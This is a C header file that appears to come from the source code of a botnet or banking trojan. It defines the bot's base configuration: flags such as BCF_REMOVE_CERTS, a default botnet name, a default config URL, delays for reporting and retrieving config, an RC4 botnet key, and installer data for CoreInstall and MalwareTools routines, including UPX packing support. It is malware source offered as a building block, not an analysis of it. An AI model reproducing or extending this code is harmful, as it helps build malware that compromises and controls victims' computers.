#pragma once
#include "crypt.h"
//Autogenerated file!

enum
{
  BCF_01                = 0x00000001,
  BCF_05                = 0x00000002,
  BCF_29                = 0x00000004,
  BCF_03                = 0x00000008,
  BCF_21                = 0x00000010,
  BCF_07                = 0x00000020,
  BCF_04                = 0x00000040,
  BCF_14                = 0x00000080,
  BCF_23                = 0x00000100,
  BCF_22                = 0x00000200,
  BCF_18                = 0x00000400,
  BCF_19                = 0x00000800,
  BCF_06                = 0x00001000,
  BCF_09                = 0x00002000,
  BCF_17                = 0x00004000,
  BCF_30                = 0x00008000,
  BCF_20                = 0x00010000,
  BCF_11                = 0x00020000,
  BCF_16                = 0x00040000,
  BCF_DISABLE_TCPSERVER = 0x00080000,
  BCF_12                = 0x00100000,
  BCF_02                = 0x00200000,
  BCF_28                = 0x00400000,
  BCF_10                = 0x00800000,
  BCF_27                = 0x01000000,
  BCF_25                = 0x02000000,
  BCF_24                = 0x04000000,
  BCF_26                = 0x08000000,
  BCF_REMOVE_CERTS      = 0x10000000,
  BCF_13                = 0x20000000,
  BCF_08                = 0x40000000,
  BCF_15                = 0x80000000
};

typedef struct
{
  BYTE  padding0[14];
  DWORD flags;                               //Flags BCF_*.
  BYTE  padding1[71];
  DWORD delayStats;                          //Delay information on reporting statisctics.
  BYTE  padding2[32];
  WCHAR defaultBotnet[BOTNET_MAX_CHARS + 1]; //The default name of a botnet.
  BYTE  padding3[8];
  DWORD delayConfig;                         //Delay information on config retrieval.
  BYTE  padding4[91];
  DWORD delayReport;                         //Delay information on reporting back.
  BYTE  padding5[7];
  char  defaultConfig[100 + 1];              //Configuration default URL.
  BYTE  padding6[42];
  Crypt::RC4KEY baseKey;                     //botnet encryption key.
  BYTE  padding7[2];
}BASECONFIG;

#if BO_PACKED==1
typedef unsigned char RELOCTABLEDATA[MAX_SIZE_RELOCATION_DATA];

#pragma pack(push, 1)
typedef struct{
	IMAGE_DATA_DIRECTORY relocDirectory; //stores in PE data directory information on relocation section
	RELOCTABLEDATA relocationTableData;  //to use UPX we need to store original relocation table (.reloc)
}MISSING_PE_DATA_INFO, *PMISSING_PE_DATA_INFO;
#pragma pack(pop)
#endif

typedef struct
{
  DWORD generateRandomNameWSize;                                 //Size MalwareTools::_GenerateRandomNameW().
  DWORD xorKey;                                                  //Encryption key.
  DWORD updateSize;                                              //Size CoreInstall::_update().
  DWORD installSize;                                             //Size CoreInstall::_install().
#if BO_PACKED==1
  MISSING_PE_DATA_INFO relocationInfo;                          //PE data directory info for relocation
#endif
}INSTALLDATA;
